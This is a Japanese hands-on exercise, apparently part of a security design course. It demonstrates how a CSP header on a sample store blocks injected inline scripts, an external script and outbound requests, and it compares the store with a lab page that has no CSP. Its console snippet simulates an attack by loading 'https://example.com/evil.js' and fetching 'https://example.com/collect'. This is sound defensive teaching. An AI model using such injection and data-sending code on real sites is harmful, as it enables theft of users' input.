---
title: セキュリティ-3 CSP で外部スクリプトを止める
---

# セキュリティ-3 CSP で外部スクリプトを止める

::: info この演習について
- 所要時間: 約 15 分
- 使うもの: 軽量版(docker compose)。`curl`、ブラウザの開発者ツール(コンソール)
- 関係する設計書: [セキュリティ方式 4.5 セキュリティヘッダと CSP](/design/architecture/10-security#s4-5)・[D-SEC-01 WAF とレート制限 4.4 セキュリティヘッダ](/design/detail/D-SEC-01-waf-and-rate-limit#s4-4)
:::

## 1. この設計書はなぜ必要か

画面に、作った人の知らないスクリプト(JS)が 1 行でも紛れ込むと、そのスクリプトはお客様のブラウザの中で、画面の文字も入力も読めてしまいます。

> **よくある事故**: 商品のレビュー欄に書かれた文字が、画面にそのまま HTML として出てしまう不具合がありました。
> そこに仕込まれたスクリプトが、購入画面の入力内容をよそのサーバーへ送っていました。見た目は何も変わらないので、気づいたのは数か月後、カード会社からの連絡でした。

入力を正しく扱う(文字として出す)のが第一の守りですが、それが漏れたときのために、**「このサイトで動いてよいスクリプトと、通信してよい相手」をブラウザに教える CSP** を最後の壁として置きます。どこまで許すかをセキュリティの方式設計書で決めます。

## 2. 何をやっているのか

サンプルストアの入口 edge は、すべての応答に `Content-Security-Policy`(CSP)ヘッダを付けています(値は `docker-compose.yml` の `EDGE_CSP`)。主な中身は次のとおりです。

| 書いてあること | 意味 |
| --- | --- |
| `script-src 'self' 'sha256-…'` | スクリプトは、このサイトの JS ファイルと、指紋(sha256)が一致する 4 つの埋め込みスクリプトだけ |
| `connect-src 'self'` | JS が通信してよいのは、このサイトだけ |
| `object-src 'none'`・`base-uri 'self'`・`form-action 'self'` | 古いプラグイン・基準 URL の書き換え・よそへのフォーム送信を禁止 |
| `frame-ancestors 'none'` | よそのサイトの枠(iframe)の中に表示させない |

演習では、お店の画面の上で、開発者ツールから「差し込まれたスクリプト」「外部のスクリプト」「外部への送信」の 3 つをわざと試し、ブラウザが止める様子を見ます。
比べるために、CSP を付けていないラボの画面(pager)でも同じことを試します。

たとえ: **CSP は「この家に入ってよい業者の名簿」を玄関に貼っておくこと** です。名簿に無い人は、たとえ家の中の誰かが招き入れても(スクリプトが差し込まれても)、家の人(ブラウザ)が追い返します。
名簿に無い宛先への荷物の発送(外部への送信)も断ります。

## 3. まず触ってみる

1. **ヘッダを見る**。

   ```bash
   curl -sI http://localhost:18080/ | grep -iE 'content-security|x-frame|x-content|referrer'
   ```

2. **お店の画面で試す**。http://localhost:18080/products を開き、開発者ツール(F12)の「コンソール」に次を貼ります。
   中身は無害です(変数に `yes` を入れるだけのスクリプト、存在しない外部のスクリプト、`example.com` への送信)。

   ```js
   const v = [];
   document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective + ' blocked=' + (e.blockedURI || 'inline')));
   window.__ran = 'no';
   const s1 = document.createElement('script'); s1.textContent = "window.__ran = 'yes'"; document.body.appendChild(s1);
   const s2 = document.createElement('script'); s2.src = 'https://example.com/evil.js'; document.body.appendChild(s2);
   let f; try { await fetch('https://example.com/collect'); f = 'fetch ok'; } catch (e) { f = 'fetch ' + e; }
   await new Promise(r => setTimeout(r, 1000));
   ({ inlineRan: window.__ran, fetch: f, violations: v })
   ```

   コンソールには、止めた理由を知らせる赤い文字も出ます。

3. **CSP の無い画面で比べる**。pager(http://localhost:19094)を開き、コンソールに次を貼ります。

   ```js
   window.__ran = 'no'; const s1 = document.createElement('script'); s1.textContent = "window.__ran = 'yes'"; document.body.appendChild(s1); window.__ran
   ```

4. **設定を読む**。`docker-compose.yml` の `EDGE_CSP` のコメントを読みます。Angular が HTML に埋め込むスクリプトだけを指紋(sha256)で許していて、Angular を更新して指紋が変わったら足す、と書いてあります。

## 4. 何が見えたら成功か

**手順 1**: 4 つのセキュリティヘッダが付いています。

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-hashes' 'sha256-VM2m…' 'sha256-8sGK…' 'sha256-AjQQ…' 'sha256-MhtP…'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY
```

**手順 2**: 3 つとも止められました。差し込んだスクリプトは動かず(`inlineRan: "no"`)、外部のスクリプトは読み込まれず、外への送信は失敗しています。

```text
{
  "fetch": "fetch TypeError: Failed to fetch",
  "inlineRan": "no",
  "violations": [
    "script-src-elem blocked=inline",
    "script-src-elem blocked=https://example.com/evil.js",
    "connect-src blocked=https://example.com/collect"
  ]
}
```

**手順 3**: CSP の無い pager では、同じスクリプトがそのまま動きます。

```text
'yes'
```

CSP があっても、差し込まれる不具合(入力をそのまま HTML にする)そのものは直りません。CSP は **差し込まれても動かさない・外に送らせない** ための最後の壁です。

## 5. ここで覚える言葉

| 言葉 | 一言でいうと | たとえ | この演習で見たもの |
| --- | --- | --- | --- |
| XSS | 画面にスクリプトを差し込まれ、お客様のブラウザで動かされる攻撃 | 家の中に知らない人を招き入れられる | 差し込んだ `window.__ran = 'yes'` |
| CSP | 動いてよいスクリプトや通信先をブラウザに教えるヘッダ | 玄関に貼った業者の名簿 | `Content-Security-Policy` |
| `script-src` | スクリプトの出どころの許可リスト | 家に入ってよい業者 | `script-src-elem blocked=inline` |
| `connect-src` | JS が通信してよい相手の許可リスト | 荷物を送ってよい宛先 | `connect-src blocked=https://example.com/collect` |
| ハッシュ(指紋) | スクリプトの中身から計算した短い値。1 文字違えば変わる | 業者の顔写真 | `'sha256-…'` が 4 つ |
| セキュリティヘッダ | ブラウザに安全のための約束を伝える応答ヘッダ | 玄関の注意書き | `X-Frame-Options: DENY` など |

## 6. 設計書ではここに書く

- **[セキュリティ方式 4.5 セキュリティヘッダと CSP](/design/architecture/10-security#s4-5)**: 「すべての応答に CSP・`X-Content-Type-Options`・`Referrer-Policy`・`X-Frame-Options` を付ける(入口で一括)」「`script-src` に `'unsafe-inline'` や外部の CDN を入れない。例外は指紋で 1 つずつ」「外部のタグ(分析・広告)を足すときは CSP の変更としてレビューする」。
- **[D-SEC-01 WAF とレート制限 4.4 セキュリティヘッダ](/design/detail/D-SEC-01-waf-and-rate-limit#s4-4)**(一般のカタログでは D-SEC-01): ヘッダごとの値と理由の表、指紋を更新する手順(Angular を更新したとき)。
- **[FE 方式 4.2 SSR で壊れない書き方](/design/architecture/01-frontend#s4-2)**: 入力を HTML として出さない(文字として出す)書き方の決まり。CSP はその守りが漏れたときの壁、と位置づけを書きます。

## 7. レビューで聞く質問

- 「CSP はすべての画面の応答に付いていますか。どこで付けていますか(入口・アプリ)。」
- 「`script-src` に `'unsafe-inline'`、`*`、外部の CDN が入っていませんか。入っているなら理由は何ですか。」
- 「外部のサービス(分析、チャット、広告)のスクリプトを足す予定はありますか。そのとき CSP は誰が見直しますか。」
- 「CSP で止められたとき(違反)に、それを集めて気づく仕組みはありますか。」
- 「入力した文字を画面に出す所で、HTML として出している箇所はありませんか。」

## 8. 片付け

この演習では設定を変えていません。コンソールで試したことは、ページを再読み込みすれば消えます。

```bash
curl -sI http://localhost:18080/ | grep -ci content-security-policy   # 1 ならよい
```
